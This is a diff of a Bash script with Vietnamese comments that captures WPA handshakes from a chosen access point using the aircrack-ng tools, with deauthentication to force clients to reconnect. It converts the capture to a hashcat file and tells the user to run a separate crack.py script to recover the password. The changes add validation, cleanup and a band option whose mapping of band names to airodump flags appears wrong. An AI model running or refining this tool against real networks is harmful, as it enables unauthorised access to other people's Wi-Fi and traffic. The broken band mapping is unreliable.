@@ -3,22 +3,47 @@
 # Ví dụ:
 #   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6
 #   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6 11:22:33:44:55:66 60
+#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 5 "" 60 6   # 6GHz (band 2.4/5/6)
 # Lưu ý: thiết bị bật PMF/802.11w có thể bỏ qua deauth — khi đó chờ client tự kết nối lại.
 set -euo pipefail
+umask 077
 
 if [[ $EUID -ne 0 ]]; then
   echo "[x] chạy bằng sudo" >&2
   exit 1
 fi
-IFACE="${1:?usage: sudo ./handshake.sh <iface> <bssid> <channel> [client_mac] [seconds]}"
+IFACE="${1:?usage: sudo ./handshake.sh <iface> <bssid> <channel> [client_mac] [seconds] [band]}"
 BSSID="${2:?thiếu BSSID}"
 CHANNEL="${3:?thiếu channel}"
 CLIENT="${4:-}"
 TIMEOUT="${5:-45}"
+BAND="${6:-}"
+
+if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+  echo "[x] BSSID không hợp lệ: $BSSID" >&2
+  exit 1
+fi
+if [[ ! "$CHANNEL" =~ ^[0-9]+$ ]]; then
+  echo "[x] channel không hợp lệ: $CHANNEL" >&2
+  exit 1
+fi
+if [[ -n "$CLIENT" && ! "$CLIENT" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+  echo "[x] client MAC không hợp lệ: $CLIENT" >&2
+  exit 1
+fi
+if [[ ! "$TIMEOUT" =~ ^[1-9][0-9]*$ ]]; then
+  echo "[x] seconds phải là số nguyên dương: $TIMEOUT" >&2
+  exit 1
+fi
+case "$BAND" in
+  ""|2.4|5|6) ;;
+  *) echo "[x] band không hợp lệ: $BAND (2.4, 5, 6)" >&2; exit 1 ;;
+esac
 
 ROOT="$(cd "$(dirname "$0")/.." && pwd)"
 OUT_DIR="$ROOT/captures"
 mkdir -p "$OUT_DIR"
+chmod 700 "$OUT_DIR" 2>/dev/null || true
 STAMP="$(date +%Y%m%d-%H%M%S)"
 PREFIX="$OUT_DIR/hs-$STAMP"
 CAP="$PREFIX-01.cap"
@@ -27,11 +52,59 @@ for tool in airodump-ng aireplay-ng aircrack-ng; do
   command -v "$tool" >/dev/null || { echo "[x] thiếu $tool. Kali: apt install aircrack-ng" >&2; exit 1; }
 done
 
+monitor_list() {
+  iw dev 2>/dev/null | awk '/Interface/ {i=$2} /type monitor/ {print i}'
+}
+
+restore_iface() {
+  local base="$1"
+  local protected="$2"
+  local mon
+  if ! iw dev "$base" info >/dev/null 2>&1; then
+    return 0
+  fi
+  for mon in $(monitor_list); do
+    if [[ "$mon" == "$base" ]]; then
+      continue
+    fi
+    if grep -qx "$mon" <<< "$protected"; then
+      continue
+    fi
+    ip link set "$mon" down 2>/dev/null || true
+    iw dev "$mon" del 2>/dev/null || true
+  done
+  if iw dev "$base" info 2>/dev/null | grep -q 'type monitor'; then
+    ip link set "$base" down 2>/dev/null || true
+    iw dev "$base" set type managed 2>/dev/null || true
+  fi
+  ip link set "$base" up 2>/dev/null || true
+}
+
 airmon-ng check kill >/dev/null 2>&1 || true
 
+OLD_MON="$(monitor_list)"
 MON=""
+DUMP_PID=""
+cleanup() {
+  if [[ -n "$DUMP_PID" ]]; then
+    kill "$DUMP_PID" 2>/dev/null || true
+    wait "$DUMP_PID" 2>/dev/null || true
+  fi
+  if [[ -n "$MON" ]]; then
+    airmon-ng stop "$MON" >/dev/null 2>&1 || true
+  fi
+  restore_iface "$IFACE" "$OLD_MON"
+}
+trap cleanup EXIT
+
 airmon-ng start "$IFACE" >/dev/null 2>&1 || true
-MON="$(iw dev | awk '/Interface/ {i=$2} /type monitor/ {print i; exit}')"
+MON=""
+for candidate in $(monitor_list); do
+  if ! grep -qx "$candidate" <<< "$OLD_MON"; then
+    MON="$candidate"
+    break
+  fi
+done
 if [[ -z "$MON" ]]; then
   if iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
     MON="$IFACE"
@@ -41,15 +114,16 @@ if [[ -z "$MON" ]]; then
   fi
 fi
 
-echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL"
-airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
+BAND_ARGS=()
+case "$BAND" in
+  2.4) BAND_ARGS=(--band a) ;;
+  5) BAND_ARGS=(--band b) ;;
+  6) BAND_ARGS=(--band g) ;;
+esac
+
+echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL${BAND:+ (band $BAND)}"
+airodump-ng -c "$CHANNEL" --bssid "$BSSID" "${BAND_ARGS[@]}" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
 DUMP_PID=$!
-cleanup() {
-  kill "$DUMP_PID" 2>/dev/null || true
-  wait "$DUMP_PID" 2>/dev/null || true
-  airmon-ng stop "$MON" >/dev/null 2>&1 || true
-}
-trap cleanup EXIT
 
 sleep 5
 
@@ -93,7 +167,7 @@ echo "[+] handshake OK → $CAP"
 
 if command -v hcxpcapngtool >/dev/null; then
   HASH="${CAP%.cap}.hc22000"
-  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30
+  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30 || true
   if [[ -s "$HASH" ]]; then
     echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
     exit 0
